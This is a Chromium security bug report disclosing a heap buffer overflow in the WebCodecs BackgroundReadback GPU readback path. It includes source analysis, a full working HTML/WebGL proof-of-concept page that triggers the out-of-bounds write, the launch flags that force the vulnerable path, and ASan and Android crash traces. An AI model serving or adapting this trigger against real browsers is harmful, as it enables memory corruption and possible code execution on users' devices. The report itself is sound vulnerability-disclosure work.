# Heap Buffer Overflow in BackgroundReadback GPU Readback with Non-Zero visibleRect Offset Leads to Renderer Process Memory Corruption

| Field | Value |
|-------|-------|
| **Issue ID** | [485683110](https://issues.chromium.org/issues/485683110) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink>Media>WebCodecs |
| **Platforms** | Android, Windows |
| **Reporter** | je...@gmail.com |
| **Assignee** | eu...@chromium.org |
| **Created** | 2026-02-19 |
| **Bounty** | $50,000.00 |

## Description

# Heap Buffer Overflow in BackgroundReadback GPU Readback with Non-Zero visibleRect Offset Leads to Renderer Process Memory Corruption

## Summary

A heap buffer overflow vulnerability exists in the WebCodecs BackgroundReadback implementation where GPU pixel readback writes beyond allocated buffer boundaries when processing VideoFrames with non-zero visibleRect offsets. When a texture-backed VideoFrame with a non-zero visible region origin is encoded through VideoEncoder, the BackgroundReadback path incorrectly computes the destination buffer pointer using GetWritableVisiblePlaneData while computing the write size based on the full coded\_size. This mismatch causes the GPU readback to write coded\_size bytes starting from an offset position within the buffer, resulting in a heap buffer overflow of up to (visibleRect.y × stride + visibleRect.x × bytesPerPixel) bytes past the allocation end. An attacker can trigger this vulnerability from JavaScript by creating a WebGL canvas-backed VideoFrame with specific visibleRect parameters and encoding it, potentially achieving arbitrary code execution in the renderer process.

## Root Cause

The vulnerability resides in the BackgroundReadback::ReadbackRGBTextureBackedFrameToMemory function which handles asynchronous GPU texture readback for RGB-format VideoFrames. The function creates a result frame using the source frame's coded\_size and visible\_rect, then obtains a destination buffer pointer via GetWritableVisiblePlaneData. This method returns a pointer offset into the plane buffer corresponding to the visible\_rect origin position. However, the SkImageInfo passed to the GPU readback operation is constructed using the full coded\_size, and the source read starts at point (0,0).

```
// third_party/blink/renderer/modules/webcodecs/background_readback.cc
void BackgroundReadback::ReadbackRGBTextureBackedFrameToMemory(
    scoped_refptr<media::VideoFrame> txt_frame,
    ReadbackToFrameDoneCallback result_cb) {
  DCHECK(CanUseRgbReadback(*txt_frame));

  SkImageInfo info = GetImageInfoForFrame(*txt_frame, txt_frame->coded_size());
  const auto format = media::VideoPixelFormatFromSkColorType(
      info.colorType(), media::IsOpaque(txt_frame->format()));

  auto result = result_frame_pool_.CreateFrame(
      format, txt_frame->coded_size(), txt_frame->visible_rect(),
      txt_frame->natural_size(), txt_frame->timestamp());

  // ... context checks ...

  base::span<uint8_t> dst_pixels =
      result->GetWritableVisiblePlaneData(media::VideoFrame::Plane::kARGB);
  int rgba_stide = result->stride(media::VideoFrame::Plane::kARGB);

  gfx::Point src_point;  // Default (0,0)
  // ...

  ri->ReadbackARGBPixelsAsync(
      shared_image->mailbox(), shared_image->GetTextureTarget(), origin,
      texture_size, src_point, info, base::saturated_cast<GLuint>(rgba_stide),
      dst_pixels,
      blink::BindOnce(&BackgroundReadback::OnARGBPixelsFrameReadCompleted,
                      WrapWeakPersistent(this), std::move(result_cb), txt_frame,
                      std::move(result)));
}

```

The GetWritableVisiblePlaneData method computes the visible region offset and returns a pointer starting at that position within the allocated buffer.

```
// media/base/video_frame.cc
base::span<uint8_t> VideoFrame::GetWritableVisiblePlaneData(size_t plane) {
  CHECK_NE(storage_type_, STORAGE_SHMEM);
  auto const_span = data_[plane];
  auto non_const_span = UNSAFE_BUFFERS(base::span(
      const_cast<uint8_t*>(const_span.data()), const_span.size()));
  return GetVisibleDataInternal(non_const_span, plane);
}

```

The GetVisibleDataInternal method offsets the pointer based on visible\_rect().origin(), returning a span that starts at (visible\_rect.y \* stride + visible\_rect.x \* bytes\_per\_pixel) bytes into the actual allocation.

When the GPU readback completes, RasterImplementation::OnAsyncARGBReadbackDone performs the actual memory copy. The destination size is computed from dst\_info which was constructed using coded\_size, not the visible region size.

```
// gpu/command_buffer/client/raster_implementation.cc
void RasterImplementation::OnAsyncARGBReadbackDone(
    AsyncARGBReadbackRequest* finished_request) {
  // ...
  while (!argb_request_queue_.empty()) {
    auto& request = argb_request_queue_.front();
    if (!request->done) {
      break;
    }

    auto* result = static_cast<cmds::ReadbackARGBImagePixelsINTERNALImmediate::Result*>(
            request->shared_memory->address());
    if (*result) {
      size_t plane_size = request->dst_size;  // Based on coded_size
      auto dst = UNSAFE_TODO(base::span<uint8_t>(
          static_cast<uint8_t*>(request->dst_pixels.get()), plane_size));
      auto src = UNSAFE_TODO(base::span<uint8_t>(
          static_cast<uint8_t*>(request->shared_memory->address()) +
              request->pixels_offset,
          plane_size));
      base::subtle::RelaxedAtomicWriteMemcpy(dst, src);  // OOB WRITE HERE
      request->readback_successful = true;
    }
    // ...
  }
}

```

The dst\_size is computed in ReadbackImagePixelsINTERNAL as dst\_info.computeByteSize(dst\_row\_bytes), which equals coded\_width × coded\_height × 4 bytes for RGBA. Since dst\_pixels points to an offset location within the buffer, writing coded\_size bytes from that position overflows past the buffer's end by exactly the offset amount.

For a frame with coded\_size of 640×480 and visible\_rect starting at (64, 64), the overflow is calculated as: 64 rows × 640 pixels × 4 bytes + 64 pixels × 4 bytes = 164,096 bytes written past the allocation boundary.

The vulnerability can be triggered when the GpuMemoryBuffer accelerated readback path is unavailable, forcing the code to use BackgroundReadback. This occurs on Android by default where kGpuMemoryBufferReadbackFromTexture is disabled, or on other platforms when the feature is explicitly disabled or when the accelerated path fails.

## Reproduce

The following HTML file demonstrates the vulnerability. It creates texture-backed VideoFrames using WebGL canvases with non-zero visibleRect offsets and encodes them through VideoEncoder, triggering the vulnerable BackgroundReadback path.

```
<!DOCTYPE html>
<html>
<head>
  <title>BackgroundReadback OOB Write PoC</title>
  <style>
    body { font-family: monospace; background: #1a1a2e; color: #eee; padding: 20px; }
    .info { color: #0ff; }
    .warn { color: #ff0; }
    .error { color: #f00; }
    .success { color: #0f0; }
    pre { background: #16213e; padding: 10px; border-radius: 5px; overflow-x: auto; }
    canvas { border: 1px solid #333; margin: 5px; }
  </style>
</head>
<body>
  <h2>CVE PoC: BackgroundReadback OOB Write</h2>
  <p class="info">Vulnerability: GetWritableVisiblePlaneData returns offset pointer, but readback uses coded_size</p>
  <pre id="log"></pre>
  <div id="canvases"></div>

<script>
const log = document.getElementById('log');
const canvasDiv = document.getElementById('canvases');

function print(msg, cls = '') {
  const line = document.createElement('div');
  line.className = cls;
  line.textContent = `[${new Date().toISOString().slice(11,23)}] ${msg}`;
  log.appendChild(line);
  console.log(msg);
}

async function sleep(ms) {
  return new Promise(r => setTimeout(r, ms));
}

function createTextureBackedFrame(width, height, visibleRect) {
  const canvas = document.createElement('canvas');
  canvas.width = width;
  canvas.height = height;

  const gl = canvas.getContext('webgl2', {
    preserveDrawingBuffer: true,
    antialias: false
  });

  if (!gl) {
    throw new Error('WebGL2 not supported');
  }

  gl.clearColor(1.0, 0.0, 0.0, 1.0);
  gl.clear(gl.COLOR_BUFFER_BIT);

  const vs = `#version 300 es
    in vec2 pos;
    out vec2 uv;
    void main() {
      uv = pos * 0.5 + 0.5;
      gl_Position = vec4(pos, 0.0, 1.0);
    }
  `;

  const fs = `#version 300 es
    precision highp float;
    in vec2 uv;
    out vec4 color;
    void main() {
      color = vec4(uv.x, uv.y, 0.5, 1.0);
    }
  `;

  function compileShader(src, type) {
    const s = gl.createShader(type);
    gl.shaderSource(s, src);
    gl.compileShader(s);
    if (!gl.getShaderParameter(s, gl.COMPILE_STATUS)) {
      throw new Error(gl.getShaderInfoLog(s));
    }
    return s;
  }

  const prog = gl.createProgram();
  gl.attachShader(prog, compileShader(vs, gl.VERTEX_SHADER));
  gl.attachShader(prog, compileShader(fs, gl.FRAGMENT_SHADER));
  gl.linkProgram(prog);
  gl.useProgram(prog);

  const buf = gl.createBuffer();
  gl.bindBuffer(gl.ARRAY_BUFFER, buf);
  gl.bufferData(gl.ARRAY_BUFFER, new Float32Array([-1,-1, 1,-1, -1,1, 1,1]), gl.STATIC_DRAW);

  const posLoc = gl.getAttribLocation(prog, 'pos');
  gl.enableVertexAttribArray(posLoc);
  gl.vertexAttribPointer(posLoc, 2, gl.FLOAT, false, 0, 0);
  gl.drawArrays(gl.TRIANGLE_STRIP, 0, 4);
  gl.finish();

  canvasDiv.appendChild(canvas);

  const frame = new VideoFrame(canvas, {
    timestamp: performance.now() * 1000,
    visibleRect: visibleRect
  });

  return frame;
}

async function triggerVulnerability() {
  print('=== BackgroundReadback OOB Write PoC ===', 'info');
  print('Target: ReadbackRGBTextureBackedFrameToMemory', 'info');
  print('');

  if (typeof VideoEncoder === 'undefined') {
    print('VideoEncoder not supported', 'error');
    return;
  }

  const codedWidth = 640;
  const codedHeight = 480;

  const visibleX = 64;
  const visibleY = 64;
  const visibleWidth = codedWidth - visibleX;
  const visibleHeight = codedHeight - visibleY;

  print(`Coded size: ${codedWidth}x${codedHeight}`, 'info');
  print(`Visible rect: x=${visibleX}, y=${visibleY}, w=${visibleWidth}, h=${visibleHeight}`, 'warn');
  print('');

  const bytesPerPixel = 4;
  const stride = codedWidth * bytesPerPixel;
  const codedBytes = codedWidth * codedHeight * bytesPerPixel;
  const visibleStartOffset = (visibleY * stride) + (visibleX * bytesPerPixel);
  const oobBytes = visibleStartOffset;

  print(`Expected memory layout:`, 'info');
  print(`  Coded buffer size: ${codedBytes} bytes`, 'info');
  print(`  Visible buffer starts at offset: ${visibleStartOffset} bytes into coded buffer`, 'warn');
  print(`  GPU readback will write ${codedBytes} bytes from visible start`, 'warn');
  print(`  OOB write size: ${oobBytes} bytes past allocation end`, 'error');
  print('');

  let encodeCount = 0;
  let errorOccurred = false;

  const encoder = new VideoEncoder({
    output: (chunk, meta) => {
      print(`Encoded chunk ${encodeCount}: ${chunk.byteLength} bytes, type=${chunk.type}`, 'success');
    },
    error: (e) => {
      print(`Encoder error: ${e.message}`, 'error');
      errorOccurred = true;
    }
  });

  const codecConfigs = [
    { codec: 'avc1.42E01E', avc: { format: 'annexb' } },
    { codec: 'vp8' },
    { codec: 'vp09.00.10.08' },
  ];

  let configuredCodec = null;

  for (const codecConfig of codecConfigs) {
    try {
      const support = await VideoEncoder.isConfigSupported({
        ...codecConfig,
        width: visibleWidth,
        height: visibleHeight,
        bitrate: 1_000_000,
        framerate: 30,
      });

      if (support.supported) {
        configuredCodec = codecConfig;
        break;
      }
    } catch (e) {
      continue;
    }
  }

  if (!configuredCodec) {
    print('No supported video codec found', 'error');
    return;
  }

  print(`Using codec: ${configuredCodec.codec}`, 'info');

  encoder.configure({
    ...configuredCodec,
    width: visibleWidth,
    height: visibleHeight,
    bitrate: 1_000_000,
    framerate: 30,
  });

  print('Encoder configured, creating texture-backed frames...', 'info');
  print('');

  const frameCount = 10;

  for (let i = 0; i < frameCount && !errorOccurred; i++) {
    try {
      const visibleRect = {
        x: visibleX,
        y: visibleY,
        width: visibleWidth,
        height: visibleHeight
      };

      const frame = createTextureBackedFrame(codedWidth, codedHeight, visibleRect);

      print(`Frame ${i}: format=${frame.format}, coded=${frame.codedWidth}x${frame.codedHeight}, ` +
            `visible=(${frame.visibleRect.x},${frame.visibleRect.y},${frame.visibleRect.width}x${frame.visibleRect.height})`, 'info');

      if (frame.visibleRect.x === 0 && frame.visibleRect.y === 0) {
        print('WARNING: visibleRect offset is zero, vulnerability may not trigger', 'warn');
      }

      encoder.encode(frame, { keyFrame: i === 0 });
      encodeCount++;
      frame.close();

      await sleep(50);

    } catch (e) {
      print(`Frame ${i} error: ${e.message}`, 'error');
    }
  }

  print('', 'info');
  print('Flushing encoder...', 'info');

  try {
    await encoder.flush();
    print('Flush completed', 'success');
  } catch (e) {
    print(`Flush error: ${e.message}`, 'error');
  }

  encoder.close();

  print('', 'info');
  print('=== PoC Execution Complete ===', 'info');
  print('', 'info');
  print('If running under ASan, check for heap-buffer-overflow errors.', 'warn');
  print('The crash should occur in RelaxedAtomicWriteMemcpy during GPU readback.', 'warn');
  print(`Summary: Frames encoded: ${encodeCount}, Codec: ${configuredCodec.codec}, OOB potential: ${oobBytes} bytes`, 'info');
}

triggerVulnerability().catch(e => print(`Fatal error: ${e.message}`, 'error'));
</script>
</body>
</html>

```

Save the above HTML as poc\_background\_readback\_oob.html in the Chromium source directory. Execute the PoC with an ASan-instrumented Chrome build using the following command.

```
ASAN_OPTIONS="detect_odr_violation=0" timeout 180 ./out/asan-release/chrome \
    --no-sandbox \
    --user-data-dir=/tmp/poc_test \
    --disable-features=GpuMemoryBufferReadbackFromTexture \
    --enable-logging=stderr \
    file:///path/to/poc_background_readback_oob.html 2>&1 | tee poc.log

```

The critical flag is `--disable-features=GpuMemoryBufferReadbackFromTexture` which forces Chrome to use the vulnerable BackgroundReadback path instead of the accelerated GPU memory buffer path. The timeout should be set to at least 180 seconds as video encoder initialization requires time to complete.

On Android, this flag is not required because `kGpuMemoryBufferReadbackFromTexture` is disabled by default, as shown in the following code.

```
// third_party/blink/renderer/platform/graphics/web_graphics_context_3d_video_frame_pool.cc:340-347
BASE_FEATURE(kGpuMemoryBufferReadbackFromTexture,
#if BUILDFLAG(IS_MAC) || BUILDFLAG(IS_WIN) || BUILDFLAG(IS_CHROMEOS) || \
    BUILDFLAG(IS_LINUX)
             base::FEATURE_ENABLED_BY_DEFAULT
#else
             base::FEATURE_DISABLED_BY_DEFAULT  // Android falls here
#endif
);

```

On Android, simply host the PoC and navigate to it in Chrome without any special flags.

The ASan output confirms the heap buffer overflow vulnerability:

```
[428355:428355:0219/145012.495630:INFO:CONSOLE:30] "Frame 0: format=RGBA, coded=640x480, visible=(64,64,576x416)", source: file:///home/user/chromium/src/poc_background_readback_oob.html (30)
[428355:428355:0219/145012.830873:INFO:CONSOLE:30] "Frame 1: format=RGBA, coded=640x480, visible=(64,64,576x416)", source: file:///home/user/chromium/src/poc_background_readback_oob.html (30)
==428434==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x7b8243753838 at pc 0x7f874f571a4b bp 0x7ffc28f11750 sp 0x7ffc28f11748
WRITE of size 8 at 0x7b8243753838 thread T0 (chrome)
SCARINESS: 42 (8-byte-write-heap-buffer-overflow)
    #0 0x7f874f571a4a in base::subtle::RelaxedAtomicWriteMemcpy(base::span<unsigned char, 18446744073709551615ul, unsigned char*>, base::span<unsigned char const, 18446744073709551615ul, unsigned char const*>) gen/third_party/libc++/src/include/__atomic/atomic_ref.h:132:5
    #1 0x7f86f829b0f6 in gpu::raster::RasterImplementation::OnAsyncARGBReadbackDone(gpu::raster::RasterImplementation::AsyncARGBReadbackRequest*) gpu/command_buffer/client/raster_implementation.cc:1573:7
    #2 0x7f86f82ad1da in void base::internal::Invoker<...>::RunImpl<...>(...) base/functional/bind_internal.h:740:12
    #3 0x7f86e1db1692 in gpu::ImplementationBase::RunIfContextNotLost(base::OnceCallback<void ()>) base/functional/callback.h:155:12
    #4 0x7f86e1db806f in base::internal::Invoker<...>::RunOnce(base::internal::BindStateBase*) base/functional/bind_internal.h:740:12
    #5 0x7f870298abea in gpu::CommandBufferProxyImpl::OnSignalAck(unsigned int, gpu::CommandBuffer::State const&) base/functional/callback.h:155:12
    #6 0x7f873c363020 in gpu::mojom::CommandBufferClientStubDispatch::Accept(gpu::mojom::CommandBufferClient*, mojo::Message*) gen/gpu/ipc/common/gpu_channel.mojom.cc:6448:13
    #7 0x7f8750c882f2 in mojo::InterfaceEndpointClient::HandleValidatedMessage(mojo::Message*) mojo/public/cpp/bindings/lib/interface_endpoint_client.cc:1085:54
    #8 0x7f8750c9f69b in mojo::MessageDispatcher::Accept(mojo::Message*) mojo/public/cpp/bindings/lib/message_dispatcher.cc:44:19
    #9 0x7f8750c8dba4 in mojo::InterfaceEndpointClient::HandleIncomingMessage(mojo::Message*) mojo/public/cpp/bindings/lib/interface_endpoint_client.cc:747:20
    #10 0x7f873c28bbe7 in IPC::ChannelAssociatedGroupController::AcceptOnEndpointThread(mojo::Message, IPC::(anonymous namespace)::ScopedUrgentMessageNotification) ipc/ipc_mojo_bootstrap.cc:1199:24
    #11 0x7f873c28dead in base::internal::Invoker<...>::RunOnce(base::internal::BindStateBase*) base/functional/bind_internal.h:740:12
    #12 0x7f874f760c82 in base::TaskAnnotator::RunTaskImpl(base::PendingTask&) base/functional/callback.h:155:12
    #13 0x7f874f7e216e in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl(base::LazyNow*) base/task/common/task_annotator.h:112:5
    #14 0x7f874f7e1146 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork() base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:346:40

allocated by thread T0 (chrome) here:
    #0 0x55a9753c09e2 in calloc (/home/user/chromium/src/out/asan-release/chrome+0x67eb9e2) (BuildId: 47eda46dea50c1e4)
    #1 0x7f874f8e724d in base::UncheckedCalloc(unsigned long, unsigned long, void**) base/process/memory_linux.cc:120:13
    #2 0x7f8739ca6aee in media::VideoFrame::AllocateMemory(bool) media/base/video_frame.cc:1713:10
    #3 0x7f8739ca6585 in media::VideoFrame::CreateFrameWithLayout(media::VideoFrameLayout const&, gfx::Rect const&, gfx::Size const&, base::TimeDelta, bool) media/base/video_frame.cc:1686:17
    #4 0x7f8739c95997 in media::VideoFrame::CreateFrameInternal(media::VideoPixelFormat, gfx::Size const&, gfx::Rect const&, gfx::Size const&, base::TimeDelta, bool) media/base/video_frame.cc:1664:10
    #5 0x7f8739cb6036 in media::VideoFramePool::PoolImpl::CreateFrame(media::VideoPixelFormat, gfx::Size const&, gfx::Rect const&, gfx::Size const&, base::TimeDelta) media/base/video_frame_pool.cc:107:13
    #6 0x7f86e77b37de in blink::BackgroundReadback::ReadbackRGBTextureBackedFrameToMemory(scoped_refptr<media::VideoFrame>, base::OnceCallback<void (scoped_refptr<media::VideoFrame>)>) third_party/blink/renderer/modules/webcodecs/background_readback.cc:171:36
    #7 0x7f86e77b323f in blink::BackgroundReadback::ReadbackTextureBackedFrameToMemoryFrame(scoped_refptr<media::VideoFrame>, base::OnceCallback<void (scoped_refptr<media::VideoFrame>)>) third_party/blink/renderer/modules/webcodecs/background_readback.cc:112:5
    #8 0x7f86e78877a7 in blink::VideoEncoder::StartReadback(scoped_refptr<media::VideoFrame>, base::OnceCallback<void (scoped_refptr<media::VideoFrame>)>) third_party/blink/renderer/modules/webcodecs/video_encoder.cc:1018:27
    #9 0x7f86e7889f4a in blink::VideoEncoder::ProcessEncode(blink::EncoderBase<blink::VideoEncoderTraits>::Request*) third_party/blink/renderer/modules/webcodecs/video_encoder.cc:1120:9
    #10 0x7f86e7811e3c in blink::EncoderBase<blink::VideoEncoderTraits>::ProcessRequests() third_party/blink/renderer/modules/webcodecs/encoder_base.cc
    #11 0x7f86e7896225 in base::internal::Invoker<...>::RunOnce(base::internal::BindStateBase*) third_party/blink/renderer/modules/webcodecs/video_encoder.cc:844:11
    #12 0x7f8739b628ca in void base::internal::DecayedFunctorTraits<...>::Invoke<...>(...) base/functional/callback.h:155:12
    #13 0x7f8739b6269a in base::internal::Invoker<...>::RunOnce(base::internal::BindStateBase*) base/functional/bind_internal.h:932:12
    #14 0x7f874f760c82 in base::TaskAnnotator::RunTaskImpl(base::PendingTask&) base/functional/callback.h:155:12
    #15 0x7f874f7e216e in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl(base::LazyNow*) base/task/common/task_annotator.h:112:5
    #16 0x7f874f7e1146 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork() base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:346:40
    #17 0x7f874f6033f1 in base::MessagePumpDefault::Run(base::MessagePump::Delegate*) base/message_loop/message_pump_default.cc:42:55
    #18 0x7f874f7e37e8 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::Run(bool, base::TimeDelta) base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:650:12
    #19 0x7f874f6cb002 in base::RunLoop::Run(base::Location const&) base/run_loop.cc:135:14
    #20 0x7f87453ff0a5 in content::RendererMain(content::MainFunctionParams) content/renderer/renderer_main.cc:364:16
    #21 0x7f87458316e7 in content::RunZygote(content::ContentMainDelegate*) content/app/content_main_runner_impl.cc:664:14
    #22 0x7f87458328ae in content::RunOtherNamedProcessTypeMain(std::__Cr::basic_string<char, std::__Cr::char_traits<char>, std::__Cr::allocator<char>> const&, content::MainFunctionParams, content::ContentMainDelegate*) content/app/content_main_runner_impl.cc:771:12
    #23 0x7f8745834e0a in content::ContentMainRunnerImpl::Run() content/app/content_main_runner_impl.cc:1150:10
    #24 0x7f874582f593 in content::RunContentProcess(content::ContentMainParams, content::ContentMainRunner*) content/app/content_main.cc:358:36
    #25 0x7f874582f91a in content::ContentMain(content::ContentMainParams) content/app/content_main.cc:371:10
    #26 0x55a9753fb9f5 in ChromeMain chrome/app/chrome_main.cc:191:12
    #27 0x7f86df029d8f in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16

SUMMARY: AddressSanitizer: heap-buffer-overflow gen/third_party/libc++/src/include/__atomic/atomic_ref.h:132:5 in base::subtle::RelaxedAtomicWriteMemcpy(base::span<unsigned char, 18446744073709551615ul, unsigned char*>, base::span<unsigned char const, 18446744073709551615ul, unsigned char const*>)

```

The crash trace confirms the vulnerability path: VideoEncoder::ProcessEncode calls StartReadback which invokes BackgroundReadback::ReadbackRGBTextureBackedFrameToMemory. The VideoFrame is allocated at that point with the visible\_rect offset. When the GPU readback completes asynchronously, RasterImplementation::OnAsyncARGBReadbackDone triggers RelaxedAtomicWriteMemcpy which writes beyond the buffer boundary, causing the heap buffer overflow.

## Attachments

- [poc_background_readback_oob.html](attachments/poc_background_readback_oob.html) (text/html, 6.9 KB)
- deleted (application/octet-stream, 0 B)
- deleted (application/octet-stream, 0 B)
- [exp.png](attachments/exp.png) (image/png, 752.4 KB)
- [exp_vtable_dispatch_crash.html](attachments/exp_vtable_dispatch_crash.html) (text/html, 5.1 KB)
- [exploit.md](attachments/exploit.md) (text/markdown, 15.0 KB)

## Timeline

### cl...@appspot.gserviceaccount.com (2026-02-19)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=5462770111676416.

### an...@chromium.org (2026-02-19)

[security shepherd]: Thanks for the report. Assigning to owner of WebCodecs for further investigation.

### eu...@chromium.org (2026-02-19)

Repro on Android, no flags or ASAN needed

```
2-19 15:19:13.339 10706 10717 F DEBUG   : Kernel Release: '6.12.58-android16-6-g84595e7cd483-ab14751050'
02-19 15:19:13.339 10706 10717 F DEBUG   : Revision: '0'
02-19 15:19:13.339 10706 10717 F DEBUG   : ABI: 'x86_64'
02-19 15:19:13.339 10706 10717 F DEBUG   : Timestamp: 2026-02-19 15:19:13.076682564-0800
02-19 15:19:13.339 10706 10717 F DEBUG   : Process uptime: 3s
02-19 15:19:13.339 10706 10717 F DEBUG   : Executable: <unknown>
02-19 15:19:13.339 10706 10717 F DEBUG   : Cmdline: org.chromium.chrome:sandboxed_process0:org.chromium.content.app.SandboxedProcessService0:7
02-19 15:19:13.339 10706 10717 F DEBUG   : pid: 10706, ppid: 32501, tid: 10717, name: CrRendererMain  >>> org.chromium.chrome:sandboxed_process0:org.chromium.content.app.SandboxedProcessService0:7 <<<
02-19 15:19:13.339 10706 10717 F DEBUG   : uid: 1090231
02-19 15:19:13.339 10706 10717 F DEBUG   : signal 11 (SIGSEGV), code 2 (SEGV_ACCERR), fault addr --------
02-19 15:19:13.339 10706 10717 F DEBUG   : Cause: possible buffer overflow accessing after secondary allocation
02-19 15:19:13.339 10706 10717 F DEBUG   :     rax 0000000000754c00  rbx 000079d33f094408  rcx 000079d34004efe0  rdx ff80ec12ff80ec12
02-19 15:19:13.339 10706 10717 F DEBUG   :     r8  5698000000020002  r9  0000000000001253  r10 000079d76232ae48  r11 0000000000000001
02-19 15:19:13.339 10706 10717 F DEBUG   :     r12 000079d43c7e4810  r13 0000000000000000  r14 000079d33ffbabe0  r15 00000000007e9000
02-19 15:19:13.339 10706 10717 F DEBUG   :     rdi 000079d33ffbabe0  rsi 0000000000000000
02-19 15:19:13.339 10706 10717 F DEBUG   :     rbp 0000000000000000  rsp 000079d3be61afb0  rip 000079d43c597ce2  err 0000000000000006
02-19 15:19:13.339 10706 10717 F DEBUG   : 44 total frames
02-19 15:19:13.339 10706 10717 F DEBUG   : backtrace:
02-19 15:19:13.339 10706 10717 F DEBUG   :       #00 pc 000000000018dce2  /data/app/~~z5eND6qgRukLSJpmOK-6PQ==/org.chromium.chrome-J5P8UdSiTk5J1CMImDWEeA==/lib/x86_64/libbase.cr.so (base::subtle::RelaxedAtomicWriteMemcpy(base::span<unsigned char, 18446744073709551615ul, unsigned char*>, base::span<unsigned char const, 18446744073709551615ul, unsigned char const*>)+450) (BuildId: d893b8a87fc51f04)
02-19 15:19:13.339 10706 10717 F DEBUG   :       #01 pc 0000000000015d3e  /data/app/~~z5eND6qgRukLSJpmOK-6PQ==/org.chromium.chrome-J5P8UdSiTk5J1CMImDWEeA==/lib/x86_64/libgpu_raster.cr.so (gpu::raster::RasterImplementation::OnAsyncARGBReadbackDone(gpu::raster::RasterImplementation::AsyncARGBReadbackRequest*)+206) (BuildId: aadf948eefec884b)
02-19 15:19:13.339 10706 10717 F DEBUG   :       #02 pc 000000000007867d  /data/app/~~z5eND6qgRukLSJpmOK-6PQ==/org.chromium.chrome-J5P8UdSiTk5J1CMImDWEeA==/lib/x86_64/libgpu_command_buffer_client_gles2_implementation.cr.so (gpu::ImplementationBase::RunIfContextNotLost(base::OnceCallback<void ()>)+45) (BuildId: d6ca7880c0380c7f)
02-19 15:19:13.339 10706 10717 F DEBUG   :       #03 pc 000000000007a0fb  /data/app/~~z5eND6qgRukLSJpmOK-6PQ==/org.chromium.chrome-J5P8UdSiTk5J1CMImDWEeA==/lib/x86_64/libgpu_command_buffer_client_gles2_implementation.cr.so (BuildId: d6ca7880c0380c7f)
02-19 15:19:13.339 10706 10717 F DEBUG   :       #04 pc 000000000001aa5d  /data/app/~~z5eND6qgRukLSJpmOK-6PQ==/org.chromium.chrome-J5P8UdSiTk5J1CMImDWEeA==/lib/x86_64/libgpu_ipc_client.cr.so (gpu::CommandBufferProxyImpl::OnSignalAck(unsigned int, gpu::CommandBuffer::State const&)+701) (BuildId: c93ad0e6aab82257)
02-19 15:19:13.339 10706 10717 F DEBUG   :       #05 pc 0000000000040adf  /data/app/~~z5eND6qgRukLSJpmOK-6PQ==/org.chromium.chrome-J5P8UdSiTk5J1CMImDWEeA==/lib/x86_64/libgpu.cr.so (gpu::mojom::CommandBufferClientStubDispatch::Accept(gpu::mojom::CommandBufferClient*, mojo::Message*)+287) (BuildId: 98027903caaade39)
02-19 15:19:13.339 10706 10717 F DEBUG   :       #06 pc 000000000002e008  /data/app/~~z5eND6qgRukLSJpmOK-6PQ==/org.chromium.chrome-J5P8UdSiTk5J1CMImDWEeA==/lib/x86_64/libmojo_public_cpp_bindings.cr.so (mojo::InterfaceEndpointClient::HandleValidatedMessage(mojo::Message*)+1144) (BuildId: 07447d85949d54b6)
02-19 15:19:13.339 10706 10717 F DEBUG   :       #07 pc 0000000000034411  /data/app/~~z5eND6qgRukLSJpmOK-6PQ==/org.chromium.chrome-J5P8UdSiTk5J1CMImDWEeA==/lib/x86_64/libmojo_public_cpp_bindings.cr.so (mojo::MessageDispatcher::Accept(mojo::Message*)+225) (BuildId: 07447d85949d54b6)
02-19 15:19:13.339 10706 10717 F DEBUG   :       #08 pc 000000000002f7dc  /data/app/~~z5eND6qgRukLSJpmOK-6PQ==/org.chromium.chrome-J5P8UdSiTk5J1CMImDWEeA==/lib/x86_64/libmojo_public_cpp_bindings.cr.so (mojo::InterfaceEndpointClient::HandleIncomingMessage(mojo::Message*)+76) (BuildId: 07447d85949d54b6)
02-19 15:19:13.339 10706 10717 F DEBUG   :       #09 pc 00000000000258e4  /data/app/~~z5eND6qgRukLSJpmOK-6PQ==/org.chromium.chrome-J5P8UdSiTk5J1CMImDWEeA==/lib/x86_64/libipc.cr.so (BuildId: 1ab23e8c5661c8ac)
02-19 15:19:13.339 10706 10717 F DEBUG   :       #10 pc 00000000000260a0  /data/app/~~z5eND6qgRukLSJpmOK-6PQ==/org.chromium.chrome-J5P8UdSiTk5J1CMImDWEeA==/lib/x86_64/libipc.cr.so (BuildId: 1ab23e8c5661c8ac)
02-19 15:19:13.339 10706 10717 F DEBUG   :       #11 pc 0000000000220e24  /data/app/~~z5eND6qgRukLSJpmOK-6PQ==/org.chromium.chrome-J5P8UdSiTk5J1CMImDWEeA==/lib/x86_64/libbase.cr.so (base::TaskAnnotator::RunTaskImpl(base::PendingTask&)+340) (BuildId: d893b8a87fc51f04)
02-19 15:19:13.339 10706 10717 F DEBUG   :       #12 pc 000000000024471d  /data/app/~~z5eND6qgRukLSJpmOK-6PQ==/org.chromium.chrome-J5P8UdSiTk5J1CMImDWEeA==/lib/x86_64/libbase.cr.so (base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl(base::LazyNow*)+1245) (BuildId: d893b8a87fc51f04)
02-19 15:19:13.339 10706 10717 F DEBUG   :       #13 pc 0000000000244109  /data/app/~~z5eND6qgRukLSJpmOK-6PQ==/org.chromium.chrome-J5P8UdSiTk5J1CMImDWEeA==/lib/x86_64/libbase.cr.so (base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork()+121) (BuildId: d893b8a87fc51f04)
02-19 15:19:13.339 10706 10717 F DEBUG   :       #14 pc 00000000001ba25c  /data/app/~~z5eND6qgRukLSJpmOK-6PQ==/org.chromium.chrome-J5P8UdSiTk5J1CMImDWEeA==/lib/x86_64/libbase.cr.so (base::MessagePumpDefault::Run(base::MessagePump::Delegate*)+124) (BuildId: d893b8a87fc51f04)
